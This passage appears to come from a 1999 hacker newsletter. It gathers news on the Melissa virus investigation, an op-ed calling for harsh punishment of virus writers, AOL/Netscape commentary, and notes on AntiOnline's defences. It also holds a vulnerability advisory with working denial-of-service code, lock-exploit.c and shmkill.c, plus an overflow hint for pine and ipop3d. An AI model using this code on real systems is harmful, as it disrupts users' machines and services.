       The Web site, which was taken down on Tuesday night by Access Orlando, the
       Internet service provider in Orlando, Fla., where the Web server was
       situated, served as a bulletin board and downloading site for viruses. It
       contained commentary by the author who identified himself as VicodinES. 
       
       
       But some virus writers contend that it is far too simplistic to
       characterize all virus writers as malicious. Some are attracted to virus
       writing because they want to deconstruct programming code, see how it
       works, and poke holes in it as an intellectual endeavor, said a longtime
       virus writer known as Attitude Adjuster. 
       
       
       "The idea that all of us out here are malicious teen-agers is quite a
       fallacy," said Attitude Adjuster, who was contacted by E-mail and declined
       to give his real name. "There are those of us who still exist in the
       community who write viruses because it's fun. We don't give our viruses to
       the public and nobody gets hurt."

 18.3  A shadowy bunch...Philly Inquirer
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 <a href="http://www.phillynews.com/inquirer/99/Apr/04/front_page/VIRU04.htm">Link</a>

       In virus arrest, a glimpse of a shadowy bunch 
       
       
       Across the country, young men are found sharing recipes for inflicting mayhem
       on computers. 
       
       
       By David Cho
       INQUIRER SUBURBAN STAFF
       
       
       David L. Smith has been arrested and identified by investigators as the
       man who unleashed Melissa on the computer world, but finding the virus'
       original creators -- members of a society of young hackers cloaked behind
       aliases and trails of code -- will be substantially harder. These hackers
       are likely to be the source, computer experts say, of future, and perhaps
       more dangerous, viruses.
       
       
       And it is these virus creators -- some as young as 14 -- that the FBI is
       now pursuing in investigations spanning the country. One member of the
       virus-making community, through his Web site, provided Smith with the
       necessary information to create and distribute his virus, authorities
       said.
       
       
       The FBI confirmed that it is still investigating the Melissa virus case.
       It is following leads based on information gathered from small Internet
       companies in Florida and Tennessee, according to officials at those
       companies. Considered unwitting hosts to Web sites that contained recipes
       for viruses, the companies are not implicated in creating or spreading the
       viruses, authorities said. 
       
       
       Smith, of Aberdeen, N.J., was arrested Thursday night. He was charged with
       releasing the virus, which affected the e-mail accounts of at least
       100,000 computers in its first five days. America Online technicians, in
       cooperation with federal agents, tracked Smith to his Monmouth County
       home.
       
       
       Through his lawyer, Smith, 30, a freelance programmer, denied any
       wrongdoing.  He was released on $100,000 bail.
       
       
       "The computer world is a world where people do things, experimental
       things, just about every day," said Smith's lawyer, Steven Altman.
       "Nothing he did, or intended to do, had a premeditated or wrongful
       intent." 
       
       
       Altman described his client as "very upset, scared and nervous. This has
       been a horrible ordeal."
       
       
       Even while refusing to release Smith's computer pseudonym, authorities
       said he was not the man behind the pseudonym, VicodinES, who is believed
       to have created the virus that Melissa was based on. VicodinES, taken from
       the name of a narcotic painkiller, frequently appears in online chat rooms
       of the virus-writing community, which calls itself the Virus Exchange.
       
       
       The problem with catching virus makers is that they work in a clandestine
       corner of cyberspace, making them difficult to track in the real world.
       They do not trust outsiders to enter into their chat rooms and almost
       never reveal their true identities. They keep their chat rooms closed
       through several techniques, by hiding behind codes or by unleashing
       miniviruses that will shut out unwanted guests.
       
       
       One man who has the trust of virus-writing circles is B.K. Delong, a Web
       consultant based in Boston. From listening to online discussions, Delong
       said the Smith arrest had thrown the virus-making community into chaos.
       Closed-door meetings were held in online chat rooms that even Delong was
       not privy to.
       
       
       The Virus Exchange, Delong said, basically has two kinds of people --
       those who simply enjoy creating and exchanging virus programs as a
       demonstration of their skills, and those who steal viruses and release
       them into the general population.
       
       
       Smith's arrest exacerbated that divide, Delong said. Some "spreaders" were
       so upset that they threatened to release viruses "that could pretty much
       destroy anything on your computer," Delong said. Melissa was relatively
       benign, they said, compared to the havoc they can wreak. 
       
       
       The "good" side of the community, though, is trying to redeem its
       reputation, Delong said. In an unusual collective statement, members of
       the Virus Exchange community said that Smith might have created Melissa,
       but he alone could not have been responsible for its rapid spread.
       
       
       "The media and investigative authorities should not be so quick to condemn
       the author of the Melissa bug," the statement said. "Instead they should
       be more interested in the person who released the bug which caused the
       spread of the virus. VicodinES has initially been blamed for the creation
       and spread of the Melissa Virus when in fact, he was not at fault."
       
       
       Delong added that no one in the community knows for sure whether Smith is
       VicodinES. "It's really hard to tell. He may not be known in the
       community, but then again he may be very well known in it," he said. "It
       all depends on when we figure out his nickname." 
       
       
       For investigators, breaking open the Melissa case had the effect of
       bringing at least one hacker -- an unidentified man in his 20s who lives
       near Kingsport, Tenn. -- to the attention of the FBI. Two months ago, that
       man asked a young local Internet company called Global Connection to host
       a Web site for him.
       
       
       Dennis Halsey, the CEO and vice president of Global Connection, said he
       did not think anything of the request at the time. In fact, Halsey did not
       require any formal application and never checked to see what the Web site
       was. Neither Halsey nor the FBI would release the man's name.
       
       
       The site turned out to be Codebreakers.org -- one of the main places that
       virus creators use to trade code. "We never imagined it to be something
       this big, believe me," said Halsey, who described the man as a computer
       wizard.
       
       
       Halsey, who is not implicated in the case, said he knew the man only
       because "it's a small town and everybody sort of knows each other." But
       Halsey thought it was inconceivable that such a young man could be the
       infamous VicodinES or another prominent virus maker. "I'm sure that he is
       not the one who wrote the virus," Halsey said. "I mean, this is a
       multinational organization, there are members everywhere. How could this
       young kid be involved?"
       
       
       Cary Nachenberg, the chief researcher at the Symantec antivirus research
       center in Cupertino, Calif., said virus-writing societies, such as
       Codebreakers and VLAD, often drew young men from the most unexpected
       places.
       
       
       "Typically they are all male, teens to mid-20s, computer literate and too
       much time on their hands," Nachenberg said. "But the good thing is as they
       grow up and find something else to do, they usually stop writing viruses."
       
       
       About the same time investigators were questioning Halsey in Tennessee, an
       FBI team in Orlando, Fla., was confiscating a computer server that
       supported SourceofKaos, a Web site authored by VicodinES.
       
       
       Investigators have said that Smith downloaded a virus from that site and
       then added his own touch to create Melissa. The server was operated by
       Roger Sibert, who rented it from a small Internet company called Access
       Orlando.
       
       
       Sibert, whose server was dedicated to freedom of speech and anti-Microsoft
       issues, does not know who VicodinES is, but said he had exchanged e-mail
       messages a couple of times. Sibert added that he was cooperating with
       investigators.
       
       
       Meanwhile, Alan McGinn, the president of Access Orlando, said the server
       computer was in the hands of federal agents who believed it had telling
       clues to the origins of SourceofKaos and the identity of the enigmatic
       VicodinES.

      Hang hackers like coin clippers 

      Christy McCormick
      National Post 

      If one takes a utilitarian approach to sentencing, then hanging cyber
      bandits for launching computer viruses like Melissa, to disable e-mail
      will be useful in discouraging others. 

      To many, executing hackers is like hanging coin clippers in the 18th
      century or horse thieves in the 19th. It seems such an over-reaction. 

      Simply shearing a sliver of silver from a passing shilling doesn't seem
      rope-worthy. Nor, from today's perspective, does horse stealing. 

      But knowledge hardens hearts. Coin clippers drove out good money
      from the market and threatened economic collapse in Britain. It had
      to be stopped and clippers were hanged briskly until it was. 

      In the wild west of America, a man without a horse was a man
      without a living. In a land with little charity and less welfare, his
      livelihood and life were threatened. Culprits received corresponding
      severity. 

      Callow geeks who threaten the world's e-mail and computer systems
      can be viewed benignly. High school hackers fiddling with macros on
      their own computers then prankishly sending them off into
      cyberspace seem like little more than boyish pranks. 

      But just as the 18th-century coin clipper threatened economic chaos,
      and the horse thief caused dangerous economic distress to the
      individual, today's hacker, who produces crippling viruses, threatens
      the system upon which the democratic world depends. 

      While detection and/or protection is desired to bring the problem to
      heel, savage penalties will do in the meantime. Such severity will at
      least separate the dilettante from the fellow who feels that wrecking
      the Internet is his calling, and thus will reduce the numbers in the
      field. 

      Admittedly, we shall put some cute kids into jail for a very long time
      or have them extradited to parts of the world they damaged, probably
      parts that care less about their welfare than we do. 

      Capital punishment may be a bit much, except in Texas, Florida, and
      Louisiana, but whatever severity can be meted out by any jurisdiction
      should be seriously considered wherever a hacker is convicted. 

      Harsh penalties are the traditional response in societies that find
      arresting culprits difficult because of an inadequacy in policing. So
      until things improve on that front, and cyber crime becomes less of a
      menace, hard sentencing is an appropriate quick fix. 

      Some think this old-fashioned, but old-fashioned society was no more
      bloody-minded than we are. The problem was inadequate policing and
      protection. It was nearly impossible to catch criminals in any number
      proportional to the crime rate in the days of the Bow Street Runner.
      That is why they made such examples of the criminals they did catch.

      Criminologists agree there is a co-relation between higher catch rates
      and leniency in sentencing. But as we wait for improved policing
      and/or protection, the natural -- and perfectly wholesome -- response
      is to be extraordinarily harsh on those involved in such crimes. We
      should also be quite uncaring about their youth and unheeding of all
      but the most extraordinary extenuating circumstances. 

      The Duke of Wellington, commanding armies in the Peninsular War
      and later after Waterloo, hanged any soldier caught looting, even if he
      only took a chicken or a pig from a local farmer. The Iron Duke had
      little retributive feeling about this. There is a story about him
      promoting a looting private to corporal after the story the man told
      showed he was capable of fighting his way in a tight corner. But, in
      general, the duke was not easily charmed. He knew he had to stop
      the looting or it would spread and his army could not count on the
      good will of the population if he ever suffered a reverse and had to
      retreat over the same ground. (American forces attacking Quebec
      weren't so careful and grabbed every chicken and pig along the way.
      They suffered the horrors of Napoleon's retreat from Moscow, partly
      because the locals of Quebec and Maine hid everything from the
      retreating looters. It was a horror story that might have be prevented
      by a little judicious hanging early on.) 

      While severity has limitations and should never be substituted for a
      quest for good detection and protection, it has a value and should be
      employed in the interim. If the West could overcome its fretting over
      exculpating features of particular crimes and deal with the problem
      with utilitarian insensitivity, it would end up having less harm done to
      the cyber citizen tomorrow by being more severe with the cyber
      bandit today.

 18.5  Second victim, erh suspect fingered on Melissa virus in Europe...

       Did Smith author Melissa?

        Analyst claims to have found German virus
        author -- has alerted the FBI.

        By Luke Reiter, ZDTV
        April 8, 1999 12:12 AM PT 


       David L. Smith is set to appear in a New Jersey courtroom at 10:30 a.m. PDT 
       Thursday in connection with charges stemming from the Melissa virus outbreak.
       But now questions are being raised as to whether he is the actual author of 
       the virus.


       Jonathan James, an 18-year-old virus analyst from Sweden who's been helping 
       the FBI with its Melissa investigation, claims to have identified a second 
       suspect who he believes was involved in the creation of Melissa.

       James won't say much about this other suspect, but he will say that the second
       suspect is a male virus writer living somewhere in Europe -- and that he has 
       already told the FBI exactly where to find that suspect. 

       James also says that this virus writer speaks German, or some language that's
       derived from German. Parts of the Melissa source code include words that appear
       to come from a Germanic language.

       "I studied his source code and compared it to the Melissa virus source code, and
       I can see several similarities that are quite striking, and this thing with the 
       German or German-related variables," James said.

       Does that mean Smith, the 30-year-old programmer from Aberdeen, N.J., did not write 
       Melissa? James says he doesn't know. According to James, it looks like Smith was 
       involved in "posting" the virus, but that he may not be the actual author.

       Of course, not everyone agrees with James' analysis. Phar Lap Software President 
       Richard Smith, who's also provided information to the FBI, says this new European
       connection may be nothing major.  In fact, it might just be plagiarism.

       "The most simple explanation here is that the virus writer didn't know how to do
       e-mail from Word, and borrowed it from someone else," Smith said. "Just because 
       some code was written in German doesn't mean that that person was involved in the
       actual Melissa virus.  It looks more like that code was simply borrowed from them."

       Yet more info on Melissa including the legal ramifications can be found on ZDNet's
       cybercrime section.

       Melissa Trail Leads to 'Ex' Virus Writer

       Site administrator says virus writer has gone into retirement, so why is his
       name at the center of the Melissa  controversy?
       By Luke Reiter and Jim Louderback  

       The administrator whose site houses a page that may belong to the creator of 
       the Melissa virus told ZDTV that he has nothing to do with the virus, and that
       the potential creator "is in retirement." 

       Roger Sibert, systems administrator for Source of Kaos, a site frequented by
       virus enthusiasts, said that site log files showed that VicodinES had not been
       active on the site for 30 days. Code written by VicodinES has been linked to
       the Melissa virus, which has run wild on the Net since appearing Friday. 

       "Last I heard, he'd gone into retirement," Sibert told ZDTV Monday night. 

       The FBI has not contacted Sibert, but the administrator said he would cooperate
       with the bureau fully if they do. 

       "I'm not hiding anything," he said. Sibert said he and VicodinES have
        communicated through email and Internet Relay Chat  forums. Sibert said he was
       impressed with VicodinES's code writing skills. 
       
       
       "He's probably talented enough to do it (the Melissa virus)," he said. 

       'Going into retirement'

       Sibert said he last communicated with VicodinES between eight months a year
       ago, when VicodinES had requested that his page be made inactive, as he was
       going into retirement. 

       The Melissa virus contains a unique number-- the Global Unique Identifier or
       GUID-- embedded in the header of an attached Microsoft Word file. That number
       points to the computer that created the Word document. ZDTV verified that the
       GUID number is the same as one contained in a virus called PSD2000.DOC,
       located on the site of a virus developer known as VicodinES. 

       However, the unique computer ID is stored in a Word document only once--
       when the document is created. Even if a document is copied to a new computer,
       and saved under a new name, the original GUID number does not change. 

       As any programmer knows, it's a lot easier to create a program by building on the
       work done by someone else. And VicodinES admits on his site that he built
       PSD2000.DOC based on a virus called Shiver. Shiver is the work of a virus
       developer calling himself ALT-F11. 

       ZDTV tracked down Shiver and checked its GUID, which also matched the one
       embedded in Melissa. In addition, another virus created by ALT-F11 (called
       Groovie2) also contains the same GUID as Shiver, Melissa and PSD2000. Because
       ALT-F11 claims to have written Groovie and Shiver, it's likely that the GUID in 
       all those viruses maps to his workstation. 

       A check of the other word macros created by VicodinES found that PSD2000.DOC
       was the only file with that GUID. All the others, which VicodinES claims he
       created, had a different GUID. 

       Melissa related to Shiver?

       What does all this mean? Whoever wrote Melissa built the virus around a Word file
       created on the same machine as Shiver.  Was this ALT-F11? Possibly, because
       Shiver and Melissa share the same GUID. However, because virus developers
       frequently build on the work of others, in the same way that VicodinES built on
       Shiver to create PSD2000.DOC, VicodinES could have written Melissa, as well. 

       Other possibilities exist. Another virus developer could have built Melissa out of
       the core of Shiver, or another developer out of another virus created on the same
       machine as the core of Shiver. 

       Finally, someone could have taken the PSD2000.DOC file and enhanced it into
       Melissa. Because VicodinES appears to be the first person to have created a Word
       2000 macro virus, it could be that the virus creator built Melissa out of Vicodin's
       PSD2000.DOC virus. Who is ALT-F11? Our information is  spotty, but ALT-F11 is a part
       of the self-styled "Alternative Virus Mafia."

       ** Summary of reported vunerabilities **
       
       
       1. Overflow in CAC.Washington.EDU ipop3d 4.xx
       2. Overflow in pine 4.xx (Linux)
       3. Lockfile vunerability in pine 4.xx (Linux)

       5. Linux 2.x IPC vunerability
       6. Linux 2.x mmap vunerability
       7. Midnight Commander 4.x bugs (x2)
       
       
       ** DETAILS **
       
       
       
       1. Overflow in CAC.Washington.EDU ipop3d 4.xx
       2. Overflow in pine 4.xx (Linux)
       
       
       Both programs, at least on Linux platform, have serious security hole.
       When data is read from so-called mailbox lock created in /tmp directory
       (this happens under certain conditions - please refer exploit code below),
       it's stored in _too_small_ buffer. It is possible to overwrite some data,
       and registers as well. For testing purposes, simple exploit code presented
       below (vunerabilities 3 and 4) could be used - suggested changes:
       
       
       write(i,"-1",2)   ->   write(i,"(about 1100 b)",1100)
       truncate(i,2)     ->   truncate(i,1100);
       
       
       Overflow in pine might be used to gain other lusers' privledges (or,
       sometimes, root privledges, depending on his stupidity ;-).
       
       
       Exploited overflow in ipop3d could be used to gain superuser access (the
       only thing done by ipop3d is setuid+setgid, no seteuid/setreuid).
       
       
       CAC.Washington.EDU ipop3d is shipped by default with Red Hat Linux,
       included in IMAP package.
       
       
       Solution: in both cases, you have to look for something like
       kill(i,SIGUSR2) in sources and modify lines just before it ;>
       
       
       -
       
       
       3. Lockfile vunerability in pine 4.xx (Linux)
       4. Lockfile vunerability in ipop3d 4.xx
       
       
       The problem is probably well known, but silently ignored by pine vendors.
       Unfortunately, it's possible to turn 'mostly harmless feature' in
       something nasty - following code allows various DoSes by killing all
       processes of luser (could be root?) every time he/she runs pine or
       receives mail via POP3 protocol:
       
       
       -- lock-exploit.c --
       // Pine 4.xx, ipop3d 4.xx and other /tmp-lock based mail stuff.
       
       
       #include <sys/file.h>
       #include <sys/stat.h>
       #include <unistd.h>
       
       
       main(int argc,char* argv[]) {
         int i,a=0;
         char s[100];
         struct stat x;
         if (!argv[1]) exit(printf("Usage: %s account_name\n",argv[0]));
         sprintf(s,"/var/spool/mail/%s",argv[1]);
         if (stat(s,&x)) exit(printf("Mailbox (%s) not found.\n",s));
         sprintf(s,"/tmp/.%x.%x",(int)x.st_dev,(int)x.st_ino);
         fchmod(i=open(s,O_RDWR|O_CREAT,0600),0666);
         while (1) {
           lseek(i,0,0);
           write(i,"-1",2);
           ftruncate(i,2);
           fsync(i);
           if (!a++) if (!flock(i,LOCK_EX)) printf("Got lock on %s.\n",s);
             else printf("File %s already locked, wait...\n",s);
           sleep(1);
         }
       }
       -- eof --
       
       
       Works well under Linux. Under BSD, pine seems to have broken mailbox
       access negotiation (fortunately ;-). No information about ipop3d.
       
       
       Mainly, this vunerability demonstrates that world-writable mailbox locks
       in /tmp are SICK IDEA (one day, as I recall, one of pine vendors said it's
       'harmless', while other solutions allows several DoS attacks... huh).
       
       
       -
       
       
       5. Linux 2.x IPC vunerability
       
       
       Linux IPC implementation seems to be broken. I noticed Alan about one/two
       months ago, so I believe it has been fixed in recent 2.2.x Linuxes. In
       fact, any luser may consume whole memory available on system using this
       simple program:
       
       
       -- shmkill.c --
       extern int errno;int i,d=1;char*x;main(){while(1){x=shmat(shmget(0,10000000/
       d,511),0,0);if(errno){d*=10;continue;}for(i=0;i<10000000/d;i++)if(*(x+i));}}
       -- eof --
       
       
       Memory won't be freed even if luser's process will be killed, you have to
       use ipcrm, but there could be not enough memory to run anything :-(
       
       
       Under early 2.2.x, you have to run this program several times, to ensure
       pages are detached (in this state, they are onwerless ;-).
       
       
       The simpliest solution is to restrict for lusers IPC at all. Only a few
       programs uses IPC - probably only dosemu and ShoutCast ;>
       
       
       -
       
       
       6. Linux 2.x mmap vunerability
       
       
       Linux 2.0.36 has the similiar problem with copy-on-write pages allocated
       with mmap - as these pages are not accounted within per-user limits.
       Fortunately, it's less harmfull than (5), because memory will be freed as
       soon as process owning it will be killed. Exploit will be NOT posted - see
       above.
       
       
       -
       
       
       7. Midnight Commander 4.x bugs (x2)
       
       
       Still not fixed. Temporary files mc are created in insecure way, allowing
       typical races. Also, entering directories containing $(...) somewhere
       might result in execution of embeeded code. Described days ago, dunno why
       it hasn't been patched.

       AOL finalized their acquisition of the browser company Netscape. And many
       Netscape employees scrambled for the door.  "So many good people have left
       by this point anyway," one Netscape staffer writes on their web page.  
       "People who were with Netscape for 3 or 4 years..."
       
       
           http://www.tarin.com/aowhat/aodiary.html
       
       
       Did AOL's unpopularity precede them? "Three other people I know are
       leaving within the month, regardless," the page continues.  "I don't think
       any of them have jobs lined up or are even very interested in looking.  
       Joe left last week without even waiting the week it would take him to get
       the bonus check."
       
       
       Steve Case had offered each of Netscape's 2300 employees an extra month's
       pay to stay until the takeover was complete, according to Wired News.
       ("AOL's mainstream corporate bent has long made it akin to the antichrist
       in the eyes of early Net users," the article notes, "scores of whom came
       to work at Netscape in its youth.")
       
       
           http://www.wired.com/news/news/business/story/16564.html
       
       
       But though the disgruntled Netscape staffer remained, they created an
       on-line diary -- "Doom@Netscape.com" -- chronicling low morale after AOL's
       takeover.  ( http://www.tarin.com/aowhat/aodiary.html ) Their site also
       offered a series of answers to frequently-asked questions, titled "How
       does it feel to wake up as an AOL employee?"
       
       
       "It sucks, duh."
       
       
           http://www.tarin.com/aowhat/aofaq.html
       
       
       "I've been proud to work for Netscape, and I will never be proud to work
       for AOL."
       
       
       They linked that response to the "Why AOL Sucks" site. 
       ( http://www.aolsucks.org )
       
       
       Harsher criticism came yesterday from Netscape's Jamie Zawinski.  "This
       buyout meant that Netscape's executives had finally given up."
       
       
           http://www.jwz.org/gruntle/aol.html
       
       
       In an on-line essay explaining his resignation from a high-profile project
       overseeing code for the Mozilla browser, Zawinski too felt compelled to
       link to the "Why AOL Sucks" page.
       
       
           http://www.jwz.org/gruntle/aol.html
           http://www.aolsucks.org/censor/
       
       
       Elsewhere, he articulated his philosophical objections to AOL.  "AOL is
       about centralization and control of content.  Everything that is good
       about the Internet, everything that differentiates it from television, is
       about empowerment of the individual.
       
       
       I don't want to be a part of an effort that could result in the
       elimination of all that."
       
       
           http://www.jwz.org/gruntle/nomo.html
       
       
       Some have resigned themselves to the inevitable.  At one recent function
       at Netscape, visitors made dark jokes about not spilling drinks on AOL's
       carpet.  But at least one Netscape employee captured their feelings with
       an e-mail tag-line re-writing South Park's familiar refrain.
       
       
       "Oh my God! They killed Netscape!"
       
       
       There was just one question remaining when Steve Case made an appearance
       at Netscape.  "After the deal closes, will you stop sending me disks?"
       
       
       Steve Case answered evasively.  "Well, the thing is, I'm sure you have
       neighbors, or friends, or family, who don't yet know about the power of
       the Internet, and I think you'll want to share--"
       
       
       "I think," Netscape's Jim Barksdale cut in, "his answer is no."

       AOL began their reign by laying-off hundreds of workers -- a whopping 425
       Netscape employees.  ( "You've Got Pink Slips," read one headline. )
       
       
           http://fnews.yahoo.com/street/99/03/25/valley_990325.html 
       
       
       But there may be more bad publicity ahead...
       
       
       The Department of Labor has launched an inquiry into AOL's employment
       practices, AOL Watch has learned.  Additional information came from an AOL
       watchdog web page, which suggests the issue is the lack of wages paid to
       on-line staffers.  Is AOL employing a force of strictly-controlled
       volunteers, using AOL tools to perform the same integral work as paid
       employees?
       
       
           http://www.observers.net/dol.html
       
       
       The page includes contact information for a Department of Labor officer --
       and even a case number.  Reached for comment, a Department of Labor
       officer added only "If we have an open investigation, I am not allowed to
       talk to the reporters."  But they acknowledged an awareness of the page's
       existence.
       
       
       But AOL's contact with the federal government doesn't end there. "AOL is
       flexing its muscle in the political world," one MSNBC article noted in
       November -- citing an "ambitious lobbying campaign" which is just "one
       piece of a multi-pronged effort by AOL to increase its influence on the
       government's decision-making process."
       
       
         http://www.zdnet.com/zdnn/stories/news/0,4586,2167455,00.html
       
       
       AOL appears concerned they'll be replaced by high-speed cable internet
       access -- and they've been aggressively lobbying with other companies for
       a place in cable offerings.  In February, however, C|Net reported that
       "Internet service providers were dealt a blow...when the FCC decided to
       postpone any decision on whether ISPs had the right to lease access on
       cable companies' pipes..."
       
       
           http://www.news.com/News/Item/0,4,31930,00.html
       
       
       Meanwhile, AOL's position drew sharp ridicule from the "Frontiers of
       Freedom"  -- a non-profit organization founded by former U.S. Senator
       Malcolm Wallop.  "AOL is now calling for the heavy hand of government to
       stifle competitors and to regulate access to the internet," the group's
       web site complains.  "[H]aving made a bad business decision to sell its
       own network, AOL has no business inviting government to hamstring
       competitors -- who have developed a superior product that's 50 to 100
       times faster than AOL's -- by regulating them."
       
       
           http://www.ffreports.org/
       
       
       The criticisms are withering.  "While they fight Internet censorship (even
       going to bat for the free speech rights of a pro-Klan group), they were
       less tolerant of a website entitled, www.aolsucks.com," the organization
       notes.  "That one hit too too close for comfort..."  the page continues --
       apparently referring to the incident detailed at
       http://www.aolsucks.org/webcens/
       
       
       But more withering comments were submitted by readers.  
       
       
       
           "Come on AOL, stop wasting money on government lobbyists and put your
            money into building a better product."
       
       
       
           "If this is the way we want to do things in this country, then I'm
            going to start a whale oil lamp company and sue the local electricity
            companies for putting me out of business; it makes as much sense."
       
       
       
            "The pure unmitigated gall of Steve Case is unbelievable."
       
       
       
           http://216.46.238.18/ubb/Forum2/HTML/000001.html
           http://216.46.238.18/ubb/Forum1/HTML/000002.html
       
       
       
       The site may be bad news for AOL.  It offers visitors the ability to
       easily contact relevant FCC and Congressional officials on-line.  ("We'll
       make sure your e-mail is delivered, and your strong beliefs are heard.")
       
       
           http://ffreports.org/help/index.html
       
       
       AOL has made light of their own drive for dominance.  "We think it would
       be good if the IRS would, on your tax form, just have a checkoff box, 'Do
       you currently subscribe to AOL,'" Steve Case joked at the National Press
       Club in March of 1996, "and if you don't, we'll send you the disk and we
       can eliminate a lot of duplication and waste."
       
       
       But the reality is less jovial.  AOL recently filed legal attacks against
       AT&T's "WorldNet" service -- for using the phrase "You have mail."  AOL's
       request to block use of that phrase -- along with the phrases "Buddy List"
       and "Instant Message" -- was rejected by a Federal District Court Judge in
       early January.  "The AOL lawsuit provides a glimpse into a Web future
       where lawyers chase ambulances in cyberspace," observed Roger Ebert this
       month in his Yahoo! Internet Life column.
       
       
       AOL's behavior suggests a philosophical danger.  "We're pleased that Judge
       Hilton has rejected this attempt by AOL to appropriate common Internet
       terms for its own exclusive use," AT&T's counsel announced in a
       statement.  But he added that "we feel this sort of overreaching by one
       company raises serious concerns about whether AOL is truly committed to
       keeping the Internet an open platform, or whether it intends to leverage
       its dominance to make the Net more proprietary."
       
       
           http://www.att.com/press/item/0,1193,262,00.html
           http://www.news.com/News/Item/0,4,30479,00.html
       
       
       Strangely, the Wall Street Journal had reported last Friday that AOL was
       "winning respect across Silicon Valley." But that same day, the Associated
       Press reported a high school drop-out broke into AOL's mainframe.
       
       
           http://www.usatoday.com/life/cyber/tech/cte673.htm
       
       
       And hours later, an AOL account was fingered as the original distributor
       of the Melissa virus.  Described as "the most widespread computer virus
       ever seen," both Reuters and the Associated Press published the AOL
       screen name to which it was eventually linked.  The account's member
       profile connected the name to a 37-year-old civil engineer in Lynnwood,
       Washington -- who says the virus-distributor had stolen access to his
       account. "I am a little jarred about the lack of security that AOL has in
       place," the engineer told C|Net, "and am now going to close my AOL
       account."
       
       
           http://www.news.com/News/Item/0,4,34435,00.html
           http://www.abcnews.go.com/sections/tech/DailyNews/virus990330.html
       
       
       Ironically, pulling up his account's profile Tuesday displayed an AOL
       banner ad advising, "Send your love on-line."
       
       
       Today the Associated Press reported the virus's originator was " snared
       with the help of technicians at America Online, and a computer task force
       of federal and state agents."
       
       
          http://cbs.marketwatch.com/archive/19990402/news/current/melissa.htx
       
       
       "This is why my aunt can't get through to AOL's tech support," one users
       joked on an on-line bulletin board.  "They're all busy chasing virus
       writers! :) " 
       
       
       http://slashdot.org/comments.pl?sid=99/04/02/1542253&threshold=-1&commentsort=0&mode=thread&cid=2076
       
       
       It's not the first AOL-related incident.  VicodinES, whose work may have
       assisted the virus's true creator, brags about creating an earlier virus
       disguised as an AOL anti-crash patch, according to Ziff-Davis News.  And
       AOL "Trojan Horses" are nothing new.  MSNBC reported on the picture.exe
       password-stealer in January.
       
       
           http://www.zdnet.com/zdnn/stories/news/0,4586,2235046,00.html
           http://www.msnbc.com/news/229572.asp
       
       
       But security problems ultimately affect AOL's business operations. In
       October, the Associated Press reported that a 21-year-old hacked into
       AOL's call-center server in Ogden to send a threatening instant message.
       ("We are sick of your censorship and bad service," it began...)
           http://www.desnews.com/cgi-bin/libstory_reg?dn98&9810180329
       
       
       AOL has actually drawn continuing criticism for their technical
       shortcomings.  Wired News reported AOL only began testing their components
       for year-2000 glitches in January.  While that may have been soon enough,
       a "Y2K" consultant warned the news outlet that "if it turns out they do
       have compliance problems, there's no time left at this point."
       
       
           http://www.wired.com/news/news/business/story/17911.html
       
       
       In fact, outages are one of AOL's ongoing expectations.  "I would like to
       be able to tell you that this sort of thing will never happen again,"
       Steve Case commented in 1996 after a 19-hour nationwide outage, "but
       frankly, I can't make that commitment."
       
       
       Ultimately the latest problems may represent business as usual in AOL's
       hacker-friendly environment.  In 1995 hackers stole Steve Case's e-mail.  
       In 1996 the Washington Post reported AOL cancelled 370,000 accounts in one
       three-month period for "credit card fraud, hacking, etc." (9/16/96.)  And
       by 1998, hackers had hit at least 34 AOL areas -- including the highlights
       for Steve Case's monthly updated.  (It's title bar changed to "Hey there
       sexy.")
       
       
       http://www.sfgate.com/cgi-bin/article.cgi?file=/chronicle/archive/1995/09/07/MN16190.DTL
       http://www.aolwatch.org/acluhack.htm
       http://www.aolwatch.org/hacks.htm
       
       
       AOL's hacker community may even have its roots in AOL's history.  Until
       September of 1995, AOL didn't confirm the authenticity of credit card
       information submitted for free-trial accounts.  The 370,000 cancelled
       accounts the next Spring may indicate how entrenched the hacker population
       had become.
       
       
       But when AOL's on-line staff questioned lax policies, AOL Vice President
       Kathy Ryan showed indifference.  One on-line gathering was told, "we
       understand that our aggressive distribution of both software and
       certificates can result in 'throwaway' accounts.  We have made the
       business decision that the benefits in this case outweigh the
       disadvantages..."
       
       
       In those crucial early months, AOL remained silent on the dangers of
       "password-thieves."  (Password-fishing con artists who turned access to
       one AOL account into unauthorized access to several others.)  Terms of
       Service staffer Chip Douglas ultimately explained AOL's dilemma --
       marketing over security -- to another on-line gathering.  "Many times we
       (AOL) are caught between a rock and a hard place debating over the
       importance of our 'community' while still trying to be as open to new
       members as possible, and NOT scare them away with needless (?)  warnings
       about PW scammers, etc."
       
       
       Later that year, Steve Case made his first public acknowledgment of the
       problem -- and Netscape's Security Documentation Manager forwarded the
       entire letter to the Cypherpunks mailing list.  "Looks like AOL is being
       dragged, kicking and screaming, into the world of security," he crowed.
       
       
       But now Netscape is being dragged into the world of AOL.
       
       
       The "Doom@Netscape" site answers the question "What are you going to do
       now?"  by saying "Wait and see what happens.  What else can I do?"
       
       
       That employee got an answer Wednesday.  They were laid off.
       
       
       
       THE LAST LAUGH
       
       
       Staffers at Netscape's "NetCenter" may have gotten the last laugh. Last
       week their site offered two news headlines -- one announcing "AOL Cuts
       Jobs at Netscape."
       
       
       The second may have voiced related concerns.  "Working for an idiot?" it
       read.  "Do something about it!"

  21.0 AntiOnline. hack attempts and intelligence gathering.
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

       http://www.AntiOnline.com/SpecialReports/antionline-security/
       
       
       [Anti-online has published some details about how they stay so secure from
       those attacks launched from "175 unique hosts a day". Curious tho..]
       
       
       http://www.AntiOnline.com/SpecialReports/antionline-security/router.html
       
       
       We use both static and recursive access lists, as well as TCP Intercept
       (I'll go more in depth about those below). The router can only be accessed
       via console (almost totally eliminates the fear of someone breaking into
       the router, which would be a bad thing.) 
       
       
       http://www.AntiOnline.com/SpecialReports/antionline-security/omg.html
       
       
       If the "user" has done several hack attempts against us, the system may
       escalate the attempt, and actually set up a deny statement in our router,
       which stops the host from even passing data into our lan. 
       
       
       [So how does their program update the router if there is console only
       access?]
       
       
       
       http://www.AntiOnline.com/SpecialReports/antionline-security/info-gathering.html
       
       
       Not only do we try to keep up with the latest exploits and
       vulnerabilities, we also try to keep up with the latest THREATS.  Exploits
       are no danger to a system at all, if there's no one trying to use them
       against you. But, as with many networks, there never seems to be a limited
       supply of people willing to use those exploits against us. So, one of the
       things that we do (and dedicate a lot of resources to), is gathering
       intelligence.
       
       
       What are the active hack groups? Who's in those groups? What groups were
       those people in before this one? What exploits were used? What are their
